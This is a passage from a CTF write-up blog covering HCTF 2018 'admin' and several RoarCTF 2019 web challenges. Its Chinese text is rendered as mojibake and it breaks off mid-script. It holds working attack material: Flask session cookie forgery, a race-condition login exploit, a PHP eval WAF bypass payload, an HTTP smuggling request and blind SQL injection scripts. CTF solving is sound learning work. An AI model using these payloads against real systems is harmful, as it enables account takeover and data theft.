strlower(session[&apos;name&apos;])        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&apos;change successful&apos;)        return redirect(url_for(&apos;index&apos;))    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)</code></pre><p>å¯ä»¥çœ‹åˆ°ç”¨ admin è´¦æˆ·ç™»é™†å³å¯å¾—åˆ° flagï¼Œè¿™é‡Œæ¶‰åŠåˆ°äº† flask session ä¼ªé€ ï¼Œç®€å•æœç´¢æˆ‘ä»¬å¯ä»¥å¾ˆå®¹æ˜“æœåˆ°pç¥çš„ session<br>è§£å¯†è„šæœ¬ï¼š</p><pre><code>#!/usr/bin/env python3import sysimport zlibfrom base64 import b64decodefrom flask.sessions import session_json_serializerfrom itsdangerous import base64_decodedef decryption(payload):    payload, sig = payload.rsplit(b&apos;.&apos;, 1)    payload, timestamp = payload.rsplit(b&apos;.&apos;, 1)    decompress = False    if payload.startswith(b&apos;.&apos;):        payload = payload[1:]        decompress = True    try:        payload = base64_decode(payload)    except Exception as e:        raise Exception(&apos;Could not base64 decode the payload because of &apos;                         &apos;an exception&apos;)    if decompress:        try:            payload = zlib.decompress(payload)        except Exception as e:            raise Exception(&apos;Could not zlib decompress the payload before &apos;                             &apos;decoding the payload&apos;)    return session_json_serializer.loads(payload)if __name__ == &apos;__main__&apos;:    print(decryption(sys.argv[1].encode()))</code></pre><p>å…ˆæ³¨å†Œä¸€ä¸ªæ™®é€šè´¦å·è¿›è¡Œç™»é™†ï¼Œå¾—åˆ°cookieï¼Œç»è¿‡è„šæœ¬è§£å¯† <code>python3 py3-flask_session_decode.py cookie</code> å¾—åˆ°ï¼š</p><pre><code>{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;goya&apos;, &apos;user_id&apos;: &apos;10&apos;}</code></pre><p>é€šè¿‡æºç æˆ‘ä»¬çœ‹åˆ°è¿™å¥è¯ <code>SECRET_KEY = os.environ.get(&#39;SECRET_KEY&#39;) or &#39;ckj123&#39;</code> ï¼Œå…¶ä¸­ <code>environ</code> æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æ‰€å¯¹åº”ç¯å¢ƒçš„æ˜ åƒå¯¹è±¡ï¼Œä¾‹å¦‚ </p><pre><code>&gt;&gt;&gt; os.environ[&apos;TEMP&apos;]&apos;C:\\Users\\*****\\AppData\\Local\\Temp&apos;</code></pre><p>å½“è·å–ä¸åˆ° <code>SECRET_KEY</code> æ—¶å°±ä½¿ç”¨ <code>ckj123</code> ä½œä¸ºå¯†é’¥ï¼Œè¿™é‡Œæˆ‘ä»¬ä¸ç¡®å®šæ˜¯ä¸æ˜¯èƒ½è·å–åˆ°ç¯å¢ƒå˜é‡é‡Œçš„keyï¼Œä½†æ˜¯æˆ‘ä»¬ç”¨ ckj123 å…ˆè¿›è¡Œæµ‹è¯•ã€‚</p><p>åˆ©ç”¨æœåˆ°çš„è„šæœ¬ <a href="https://github.com/noraj/flask-session-cookie-manager">https://github.com/noraj/flask-session-cookie-manager</a> ä¿®æ”¹ <code>name</code> ä¸º <code>admin</code> æ¥ç”Ÿæˆä¼ªé€ çš„cookieï¼š</p><pre><code>python2 flask_session_cookie_manager2.py encode -s &quot;ckj123&quot; -t &quot;{&apos;_fresh&apos;: True, &apos;_id&apos;: b&apos;bbf3746b9cd211acd60600a7d24fc55c2dcf65c790142d9b984e1d954d61201b76dbcc4c5221672ce13679718528b34f3f45b7afc79b6384c9b8e7168aa6e8f3&apos;, &apos;csrf_token&apos;: b&apos;b7b7b2574958167d3670aa0e5bf46e47b60d1e39&apos;, &apos;image&apos;: b&apos;TmDp&apos;, &apos;name&apos;: &apos;admin&apos;, &apos;user_id&apos;: &apos;10&apos;}&quot;</code></pre><p>ç”Ÿæˆæ–° cookieï¼š</p><pre><code>.eJxNkEGPgjAQhf_KpmcPWPBC4kFSIZDMEE2xaS-ERQQKdRPUKBj_-1Y3WT1NMm_me2_mTvLDUJ0a4p-HSzUjebsn_p18fROfSJMYmEoHTbyQdDMCDxtbKTB5hWjtKhY7ysAcBYwqQoN6p3HqrsA3o2J9m_LaUTzsUp45iskb6NVN6pKqKNFy2mrksWVKFwz2wIHaXRd4PQfdtDBtDVDpoIhdKZTl9i1q8DCChdRNj9OaplHYoMk8pWFJHjNSnoZDfv7pquP7BL1vkcYj8tKxMbynnWJPq6CRPOhRJAaZ6pHZOR10ILIp3SxfuNYUdfVP2kXzdbn6U46FeQtSbM-F8F7C5VQNnx8EvrL9xy8gAnGJ.XcK0Ow.1V55Ih_Ip48Y5fgVUgbSNrQlWyU</code></pre><p>æ­¤æ—¶æˆ‘ä»¬æ›¿æ¢å·²ç»ç™»é™†è´¦å·çš„ cookie å³å¯å¾—åˆ°flag</p><h3 id="unicodeæ¬ºéª—"><a href="#unicodeæ¬ºéª—" class="headerlink" title="unicodeæ¬ºéª—"></a>unicodeæ¬ºéª—</h3><p>çœ‹WPçœ‹åˆ°çš„å¦ä¸€ç§æ–¹æ³•ï¼ŒæŒºæœ‰æ„æ€</p><p>è§‚å¯Ÿè·¯ç”±å¤„çš„ä»£ç ï¼š</p><pre><code>@app.route(&apos;/register&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def register():    if current_user.is_authenticated:        return redirect(url_for(&apos;index&apos;))    form = RegisterForm()    if request.method == &apos;POST&apos;:        **name = strlower(form.username.data)**        if session.get(&apos;image&apos;).lower() != form.verify_code.data.lower():            flash(&apos;Wrong verify code.&apos;)            return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form=form)        if User.query.filter_by(username = name).first():            flash(&apos;The username has been registered&apos;)            return redirect(url_for(&apos;register&apos;))        user = User(username=name)        user.set_password(form.password.data)        db.session.add(user)        db.session.commit()        flash(&apos;register successful&apos;)        return redirect(url_for(&apos;login&apos;))    return render_template(&apos;register.html&apos;, title = &apos;register&apos;, form = form)@app.route(&apos;/login&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def login():    if current_user.is_authenticated:        return redirect(url_for(&apos;index&apos;))    form = LoginForm()    if request.method == &apos;POST&apos;:        **name = strlower(form.username.data)**        session[&apos;name&apos;] = name        user = User.query.filter_by(username=name).first()        if user is None or not user.check_password(form.password.data):            flash(&apos;Invalid username or password&apos;)            return redirect(url_for(&apos;login&apos;))        login_user(user, remember=form.remember_me.data)        return redirect(url_for(&apos;index&apos;))    return render_template(&apos;login.html&apos;, title = &apos;login&apos;, form = form)@app.route(&apos;/change&apos;, methods = [&apos;GET&apos;, &apos;POST&apos;])def change():    if not current_user.is_authenticated:        return redirect(url_for(&apos;login&apos;))    form = NewpasswordForm()    if request.method == &apos;POST&apos;:        **name = strlower(session[&apos;name&apos;])**        user = User.query.filter_by(username=name).first()        user.set_password(form.newpassword.data)        db.session.commit()        flash(&apos;change successful&apos;)        return redirect(url_for(&apos;index&apos;))    return render_template(&apos;change.html&apos;, title = &apos;change&apos;, form = form)</code></pre><p>python å·²ç»æœ‰äº†è‡ªå·±çš„ lower() å‡½æ•°ä¸ç”¨ï¼Œç”¨äº†è‡ªå·±å®šä¹‰çš„ strlower() ï¼Œè¿›åˆ°è¿™ä¸ªå‡½æ•°ï¼š</p><pre><code>def strlower(username):    username = nodeprep.prepare(username)    return username</code></pre><p>å¯ä»¥çœ‹åˆ° <code>from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep</code> è¿™ä¸ªå‡½æ•°æ¥è‡ª twisted ,è€Œé¢˜ç›®ä¸­ <code>Twisted==10.2.0</code> ,ç‰ˆæœ¬å·®è·æœ‰ç‚¹å¤§ã€‚</p><p>å¯¹äºä¸€äº›å­—ç¬¦ï¼Œ<a href="https://unicode-table.com/en/search/?q=small+capital" target="_blank" rel="noopener">https://unicode-table.com/en/search/?q=small+capital</a> è¿™ä¸ªå‡½æ•°çš„ä½œç”¨å°±æ˜¯</p><pre><code>á´€ -&gt; A -&gt; a</code></pre><p>æˆ‘ä»¬åœ¨ä¸Šé¢çš„ç½‘ç«™ä¸Šæ‰¾åˆ°ä¸€ä¸ª <code>Ä</code> ï¼Œç„¶åæ³¨å†Œ <code>Ädmin</code> ,æ­¤æ—¶ç»è¿‡ä¸€æ¬¡ <code>strlower()</code> å˜ä¸º <code>ADMIN</code> ï¼Œä¹‹åæˆ‘ä»¬ç™»é™† <code>ADMIN</code> ï¼Œå†ç»è¿‡ä¸€æ¬¡ <code>strlower()</code> å°±æˆä¸ºäº† <code>admin</code> ã€‚</p><h3 id="æ¡ä»¶ç«äº‰"><a href="#æ¡ä»¶ç«äº‰" class="headerlink" title="æ¡ä»¶ç«äº‰"></a>æ¡ä»¶ç«äº‰</h3><p>å…ˆæ³¨å†Œä¸€ä¸ªç”¨æˆ·ç„¶åå¼€ä¸€ä¸ªçº¿ç¨‹æ”¹å¯†ç ï¼Œå¦ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ admin ç™»é™†ï¼Œåœ¨æŸä¸€ç¬é—´ç”Ÿæˆ admin çš„session æ—¶æˆ‘ä»¬æ”¹å¯†ç çš„æ“ä½œä¹Ÿåˆ°äº†ï¼Œè¿™æ—¶å°±å¯ä»¥ä¿®æ”¹å¯†ç äº†</p><pre><code>exp.pyimport requestsimport threadingdef login(s, username, password):    data = {        &apos;username&apos;: username,        &apos;password&apos;: password,        &apos;submit&apos;: &apos;&apos;    }    return s.post(&quot;http://admin.2018.hctf.io/login&quot;, data=data)def logout(s):    return s.get(&quot;http://admin.2018.hctf.io/logout&quot;)def change(s, newpassword):    data = {        &apos;newpassword&apos;:newpassword    }    return s.post(&quot;http://admin.2018.hctf.io/change&quot;, data=data)def func1(s):    login(s, &apos;skysec&apos;, &apos;skysec&apos;)    change(s, &apos;skysec&apos;)def func2(s):    logout(s)    res = login(s, &apos;admin&apos;, &apos;skysec&apos;)    if &apos;&lt;a href=&quot;/index&quot;&gt;/index&lt;/a&gt;&apos; in res.text:        print(&apos;finish&apos;)def main():    for i in range(1000):        print(i)        s = requests.Session()        t1 = threading.Thread(target=func1, args=(s,))        t2 = threading.Thread(target=func2, args=(s,))        t1.start()        t2.start()if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>roarctf 2019</title>
      <link href="/2019/10/16/roarctf-2019/"/>
      <url>/2019/10/16/roarctf-2019/</url>
      
        <content type="html"><![CDATA[<h1 id="roarctf-2019"><a href="#roarctf-2019" class="headerlink" title="roarctf 2019"></a>roarctf 2019</h1><p>10/16/2019 4:45:49 PM </p><h2 id="easy-java"><a href="#easy-java" class="headerlink" title="easy_java"></a>easy_java</h2><p>æ‹¿åˆ°é¢˜ç›®çœ‹åˆ°æ–‡ä»¶ä¸‹è½½çš„æ¥å£ï¼Œå°è¯• <code>/Download?filename=help.docx</code> ,å‘ç°æ²¡æ³•ä¸‹è½½ï¼Œå°è¯•ä¸‹è½½ç½‘é¡µä¸Šçš„ç…§ç‰‡å‘ç°ä¹Ÿä¸‹è½½ä¸äº†ï¼Œåæ¥å°±è·‘åäº†ï¼Œåœ¨æƒ³ä¼šä¸ä¼šæ˜¯ <code>SSTI</code> ?fuzzäº†åŠå¤©ä¹Ÿæ²¡æ‰¾åˆ°æ€è·¯.  ğŸ¨</p><p>æ”¹å˜è¯·æ±‚æ–¹å¼ä¸º <code>post</code> å³å¯æˆåŠŸä¸‹è½½åˆ° <code>help.docx</code> ,é‡Œè¾¹æ²¡æœ‰ä»€ä¹ˆæœ‰ç”¨çš„ä¿¡æ¯ã€‚ </p><p>éšä¾¿ä¸‹è½½ä¸€ä¸ªä¸å­˜åœ¨çš„æ–‡ä»¶ï¼Œå¾—åˆ°æŠ¥é”™ä¿¡æ¯é‡Œæœ‰æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯ã€‚åšçš„æ—¶å€™å°±è¢«éš¾åˆ°çš„åœ°æ–¹å°±æ˜¯æ–‡ä»¶ä¸‹è½½ä¸çŸ¥é“ä¸‹è½½ä»€ä¹ˆä¸œè¥¿ã€‚è®°å¾—ä¸Šæ¬¡ç¢°åˆ°è¿™ç§é¢˜çš„æ—¶å€™è¿˜æ˜¯ <code>SUCTF</code> è¯» <code>nginx</code> é…ç½®æ–‡ä»¶</p><h3 id="ä»€ä¹ˆæ˜¯-WEB-INF"><a href="#ä»€ä¹ˆæ˜¯-WEB-INF" class="headerlink" title="ä»€ä¹ˆæ˜¯ WEB-INF"></a>ä»€ä¹ˆæ˜¯ WEB-INF</h3><blockquote><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ã€‚æ‰€è°“å®‰å…¨å°±æ˜¯å®¢æˆ·ç«¯æ— æ³•è®¿é—®ï¼Œåªæœ‰æœåŠ¡ç«¯å¯ä»¥è®¿é—®çš„ç›®å½•ã€‚å¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p></blockquote><ol><li><p>/WEB-INF/web.xml</p><p> Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶ï¼Œæè¿°äº† servlet å’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™ã€‚</p></li><li><p>/WEB-INF/classes/</p><p> åŒ…å«äº†ç«™ç‚¹æ‰€æœ‰ç”¨çš„ class æ–‡ä»¶ï¼ŒåŒ…æ‹¬ servlet class å’Œéservlet classï¼Œä»–ä»¬ä¸èƒ½åŒ…å«åœ¨ .jaræ–‡ä»¶ä¸­ï¼ˆæ˜¯è¯¥ç›®å½•ä¸èƒ½åŒ…å«åœ¨.jaræ–‡ä»¶ä¸­ï¼‰ã€‚</p></li></ol><p>å…¶ä»–çš„é…ç½®æ–‡ä»¶ä»‹ç»çœ‹<a href="https://baike.baidu.com/item/web-inf" title="è¿™é‡Œ" target="_blank" rel="noopener">https://baike.baidu.com/item/web-inf</a></p><p>äº‹å®ä¸Šå°±æ˜¯åœ¨xmlä¸­é…ç½®å¥½æ˜ å°„è·¯å¾„ç„¶åè¿›è¡Œå¯¹æŸäº›å«å—ä¿æŠ¤å†…å®¹æ–‡ä»¶çš„è®¿é—®ã€‚</p><p>æˆ‘ä»¬è®¿é—® <code>WEB-INF/web.xml</code> å‘ç°æ“ä½œflagçš„å…³é”®é…ç½®</p><p>æŒ‰ç…§æ˜ å°„å…³ç³»è®¿é—® <code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code> å³å¯å¾—åˆ°è§£å¯†çš„å­—ç¬¦ä¸²ï¼Œbase64è§£å¯†å³å¯</p><h2 id="easy-calc"><a href="#easy-calc" class="headerlink" title="easy_calc"></a>easy_calc</h2><p>å³é”®æŸ¥çœ‹æºç </p><pre><code>&lt;?phperror_reporting(0);if(!isset($_GET[&apos;num&apos;])){    show_source(__FILE__);}else{        $str = $_GET[&apos;num&apos;];        $blacklist = [&apos; &apos;, &apos;\t&apos;, &apos;\r&apos;, &apos;\n&apos;,&apos;\&apos;&apos;, &apos;&quot;&apos;, &apos;`&apos;, &apos;\[&apos;, &apos;\]&apos;,&apos;\$&apos;,&apos;\\&apos;,&apos;\^&apos;];        foreach ($blacklist as $blackitem) {                if (preg_match(&apos;/&apos; . $blackitem . &apos;/m&apos;, $str)) {                        die(&quot;what are you want to do?&quot;);                }        }        eval(&apos;echo &apos;.$str.&apos;;&apos;);}?&gt; </code></pre><p>æœ‰wafï¼Œè¿™é‡Œæœ‰ä¸¤ç§æ–¹æ³•ç»•è¿‡ï¼š</p><ol><li>åˆ©ç”¨å­—ç¬¦ä¸²è§£æç‰¹æ€§ Bypass</li></ol><p>åŸç†çœ‹è¿™ç¯‡æ–‡ç« ï¼š<br><a href="https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/" target="_blank" rel="noopener">https://www.secjuice.com/abusing-php-query-string-parser-bypass-ids-ips-waf/</a></p><p>è¿™é‡Œè¯´ä¸€ä¸‹å¤§æ¦‚æ„æ€<br> PHP å¤„ç† GET or POST è¯·æ±‚æ—¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²è½¬æ¢æˆæ•°ç»„ <code>/?foo=bar becomes Array([foo] =&gt; &quot;bar&quot;)</code> ã€‚å‚æ•°åé‡Œçš„ä¸€äº›å­—ç¬¦ä¼šè¢«ç§»é™¤æˆ–æ›¿æ¢æˆä¸‹åˆ’çº¿ <code>/?%20news[id%00=42 will be converted to Array([news_id] =&gt; 42)</code> å¦‚æœWAFè§„åˆ™æ˜¯å‚æ•°é‡Œå«æœ‰ä¸€ä¸ªéæ•°å€¼å‹çš„å€¼æ—¶è¿›è¡Œæ‹¦æˆªæ—¶ï¼Œæˆ‘ä»¬å°±å¯ä»¥ç”¨ä¸‹åˆ—è¯­å¥ç»•è¿‡<code>/news.php?%20news[id%00=42&quot;+AND+1=0--</code> å®ƒä¼šè¢«å­˜å‚¨åœ¨ <code>$_GET[&quot;news_id&quot;]</code> ã€‚</p><p>è¿™æ˜¯æµ‹è¯•phpæ˜¯å¦‚ä½•å¤„ç†ç‰¹æ®Šå­—ç¬¦ï¼š</p><pre><code>&lt;?phpforeach(    [        &quot;{chr}foo_bar&quot;,        &quot;foo{chr}bar&quot;,        &quot;foo_bar{chr}&quot;    ] as $k =&gt; $arg) {    for($i=0;$i&lt;=255;$i++) {        echo &quot;\033[999D\033[K\r&quot;;        echo &quot;[&quot;.$arg.&quot;] check &quot;.bin2hex(chr($i)).&quot;&quot;;        parse_str(str_replace(&quot;{chr}&quot;,chr($i),$arg).&quot;=bla&quot;,$o);        /* yes... I&apos;ve added a sleep time on each loop just for        the scenic effect :)like that movie with unrealistic        brute-force where the password are obtained        one byte at a time (âˆ©ï½€-Â´)âŠƒâ”â˜†ï¾Ÿ.*ï½¥ï½¡ï¾Ÿ        */        usleep(5000);        if(isset($o[&quot;foo_bar&quot;])) {            echo &quot;\033[999D\033[K\r&quot;;            echo $arg.&quot; -&gt; &quot;.bin2hex(chr($i)).&quot; (&quot;.chr($i).&quot;)\n&quot;;        }    }    echo &quot;\033[999D\033[K\r&quot;;    echo &quot;\n&quot;;}</code></pre><p>è¿™é“é¢˜ç›®ç»è¿‡æµ‹è¯•å‚æ•°å‰åŠ ä¸€ä¸ª <code>%20</code>æˆ–è€… <code>+</code> æ¥ç»•è¿‡</p><ol start="2"><li>httpåè®®èµ°ç§æ”»å‡»</li></ol><blockquote><p>å½“æˆ‘ä»¬å‘ä»£ç†æœåŠ¡å™¨å‘é€ä¸€ä¸ªæ¯”è¾ƒæ¨¡ç³Šçš„HTTPè¯·æ±‚æ—¶ï¼Œç”±äºä¸¤è€…æœåŠ¡å™¨çš„å®ç°æ–¹å¼ä¸åŒï¼Œå¯èƒ½ä»£ç†æœåŠ¡å™¨è®¤ä¸ºè¿™æ˜¯ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œç„¶åå°†å…¶è½¬å‘ç»™äº†åç«¯çš„æºç«™æœåŠ¡å™¨ï¼Œä½†æºç«™æœåŠ¡å™¨ç»è¿‡è§£æå¤„ç†åï¼Œåªè®¤ä¸ºå…¶ä¸­çš„ä¸€éƒ¨åˆ†ä¸ºæ­£å¸¸è¯·æ±‚ï¼Œå‰©ä¸‹çš„é‚£ä¸€éƒ¨åˆ†ï¼Œå°±ç®—æ˜¯èµ°ç§çš„è¯·æ±‚ï¼Œå½“è¯¥éƒ¨åˆ†å¯¹æ­£å¸¸ç”¨æˆ·çš„è¯·æ±‚é€ æˆäº†å½±å“ä¹‹åï¼Œå°±å®ç°äº†HTTPèµ°ç§æ”»å‡»ã€‚</p></blockquote><p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡ CL-CL æ¥Bypass</p><pre><code>POST /calc.php?num=phpinfo() HTTP/1.1Host: ********User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0Accept: */*Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateX-Requested-With: XMLHttpRequestConnection: keep-aliveReferer: **********Cookie: __cfduid=***********X-Forwarded-For: 127.0.0.1Content-Length: 7Content-Length: 7Content-Type: application/x-www-form-urlencodednum=111</code></pre><p>ç»•è¿‡wafä¹‹åè¿˜ç¦æ‰äº†ä¸€äº›å­—ç¬¦ä¸èƒ½ç›´æ¥è¯»åˆ° flag ã€‚</p><p>å…ˆå­¦ä¹ å‡ ä¸ªå‡½æ•°</p><ul><li>ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼</li><li>bin2hex â€” å‡½æ•°æŠŠåŒ…å«æ•°æ®çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²è½¬æ¢ä¸ºåå…­è¿›åˆ¶å€¼</li><li>hex2bin â€” è½¬æ¢åå…­è¿›åˆ¶å­—ç¬¦ä¸²ä¸ºäºŒè¿›åˆ¶å­—ç¬¦ä¸²</li><li>dechex â€” åè¿›åˆ¶è½¬æ¢ä¸ºåå…­è¿›åˆ¶</li><li>base_convert â€” åœ¨ä»»æ„è¿›åˆ¶ä¹‹é—´è½¬æ¢æ•°å­—</li><li>hexdec â€” åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶</li></ul><p>è¯»å–flag</p><pre><code>?+num=file_get_contents(hex2bin(dechex(52115961636711)))</code></pre><h2 id="Online-Proxy"><a href="#Online-Proxy" class="headerlink" title="Online Proxy"></a>Online Proxy</h2><p>æ‰“å¼€é¶æœºï¼ŒæŠ“åŒ…å‘ç°å“åº”å¤´</p><pre><code>&lt;!-- Debug Info:  Duration: 0.058279037475586 s  Current Ip: 127.0.0.1 </code></pre><p>åœ¨ XFF å¤„å°è¯•ä¿®æ”¹å†…å®¹ï¼Œå‘ç°å¯ä»¥ä¿®æ”¹æˆåŠŸã€‚<code>Current Ip</code> å¤„æ˜¾ç¤ºå½“å‰çš„ XFFå€¼ï¼Œ<code>Last Ip</code> æ˜¾ç¤ºä¸Šæ¬¡æŸ¥è¯¢å†…å®¹ã€‚æ‰§è¡Œ sleep() è¯­å¥ <code>1&#39; and sleep(3) and 1=&#39;1</code> å‘ç°åœ¨ç¬¬äºŒæ¬¡è¿›è¡Œä¿®æ”¹å‘åŒ…ä¹‹åæˆåŠŸæ‰§è¡Œï¼Œå­˜åœ¨äºŒæ¬¡æ³¨å…¥ã€‚</p><p>æ‰€è°“äºŒæ¬¡æ³¨å…¥å°±æ˜¯æœåŠ¡ç«¯åœ¨ç¬¬ä¸€æ¬¡æ¥æ”¶è„æ•°æ®æ—¶å¯¹æ•°æ®è¿›è¡Œäº† <code>addslashes</code> æˆ– <code>mysql_escape_string</code>  å¤„ç†ï¼Œä½†æ˜¯å­˜å…¥æ•°æ®åº“æ—¶å­˜çš„è¿˜æ˜¯è„æ•°æ®ï¼Œäºæ˜¯åœ¨ç¬¬äºŒæ¬¡æŸ¥è¯¢æ—¶ç”±äºæŸ¥è¯¢çš„æ˜¯è„æ•°æ®ï¼Œä¿¡æ¯ä»ç„¶ä¼šæ³„éœ²ã€‚</p><p>æŸ¥çœ‹æºç ï¼š</p><pre><code>header(&quot;Content-type: &quot;. $mime_type.&quot;; charset=UTF-8&quot;);$content = str_replace(&quot;&lt;a href=\&quot;&quot;, &quot;&lt;a href=\&quot;/?url=&quot;, $content);$content = str_replace(&quot;&lt;a href=&apos;&quot;, &quot;&lt;a href=&apos;/?url=&quot;, $content);echo($content);$end = microtime(true);$time = $end - $start;$last_ip = &quot;&quot;;$result = query(&quot;select current_ip, last_ip from ip_log where uuid = &apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);if(count($result) &gt; 0) {    if($ip !== $result[0][&apos;current_ip&apos;]) {        $last_ip = $result[0][&apos;current_ip&apos;];        query(&quot;delete from ip_log where uuid=&apos;&quot;.addslashes($uuid).&quot;&apos;&quot;);    } else {        $last_ip = $result[0][&apos;last_ip&apos;];    }}query(&quot;insert into ip_log values (&apos;&quot;.addslashes($uuid).&quot;&apos;, &apos;&quot;.addslashes($ip).&quot;&apos;, &apos;$last_ip&apos;);&quot;);die(&quot;\n&lt;!-- Debug Info: \n Duration: $time s \n Current Ip: $ip &quot;.($last_ip !== &quot;&quot; ? &quot;\nLast Ip: &quot;.$last_ip : &quot;&quot;).&quot; --&gt;&quot;);</code></pre><p>å¯ä»¥çœ‹åˆ°åœ¨æŸ¥è¯¢åˆ°æ•°æ®ä¹‹åï¼Œå¦‚æœ <code>$ip !== $result[0][&#39;current_ip&#39;]</code> é‚£ä¹ˆ <code>$last_ip = $result[0][&#39;current_ip&#39;];</code> ï¼Œéšåå°† last_ip ä¸å¸¦è¿‡æ»¤çš„å¸¦å…¥æ•°æ®åº“ä¸­æŸ¥è¯¢ã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬æ³¨å…¥çš„æ€è·¯å°±æ˜¯å…ˆå°† exp æ’å…¥æ•°æ®ï¼Œç„¶åå†æ­£å¸¸è®¿é—®ä¸€æ¬¡å°†æ•°æ®å¸¦å‡ºã€‚</p><p>exp:</p><pre><code>import requestsfrom time import sleepurl = &quot;http://node3.buuoj.cn:28063/&quot;s = requests.session()re = s.get(url)name = &apos;&apos;&quot;&quot;&quot;# database name# current db : ctf# information_schema,test,mysql,ctftraining,performance_schema,F4l9_D4t4B45e,ctffor i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(schema_name) from information_schema.schemata),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;&quot;&quot;&quot;# table name# ctf : ip_log# F4l9_D4t4B45e : F4l9_t4b1efor i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=&apos;F4l9_D4t4B45e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;&quot;&quot;&quot;# column_name# F4l9_D4t4B45e.F4l9_t4b1e : F4l9_C01uMnfor i in range(1,20):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=&apos;F4l9_D4t4B45e&apos;and table_name=&apos;F4l9_t4b1e&apos;),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break&quot;&quot;&quot;for i in range(1,100):    print &apos;[+]: &apos;,i    for j in range(33,128):        sleep(0.01)        headers1 = {&quot;X-Forwarded-For&quot;: &apos;1&apos;}        headers2 = {    &quot;X-Forwarded-For&quot;:&quot;1&apos; and if(ascii(substr((select group_concat(F4l9_C01uMn) from F4l9_D4t4B45e.F4l9_t4b1e),{},1))={} ,sleep(3),0) and 1=&apos;1&quot;.format(i,j)}        re1 = s.get(url,headers = headers2)        try:            re2 = s.get(url,headers=headers1,timeout=2)        except Exception as e:            #print &quot;[-]: &quot;+str(e)            name += chr(j)            print name            break</code></pre><p>è¿™ä¸ªå¤ªä¸ä¼˜é›…äº†ï¼Œèµµå¸ˆå‚…çš„æ›´ä¼˜é›…ï¼š</p><pre><code>#!/usr/bin/env python3import requeststarget = &quot;http://localhost:8302/&quot;def execute_sql(sql):    print(&quot;[*]è¯·æ±‚è¯­å¥ï¼š&quot; + sql)    return_result = &quot;&quot;    payload = &quot;0&apos;|length((&quot; + sql + &quot;))|&apos;0&quot;    session = requests.session()    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: payload})    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})    r = session.get(target, headers={&apos;X-Forwarded-For&apos;: &apos;glzjin&apos;})    start_pos = r.text.find(&quot;Last Ip: &quot;)    end_pos = r.text.find(&quot; --&gt;&quot;, start_pos)    length = int(r.text[start_pos + 9: end_pos])    print(&quot;[+]é•¿åº¦ï¼š&quot; + str(length))    for i in range(1, length + 1, 5):        payload = &quot;0&apos;|conv(hex(substr((&quot; + sql + &quot;),&quot; + str(i) + &quot;,5)),16,10)|&apos;0&quot;        r = session.get(target, 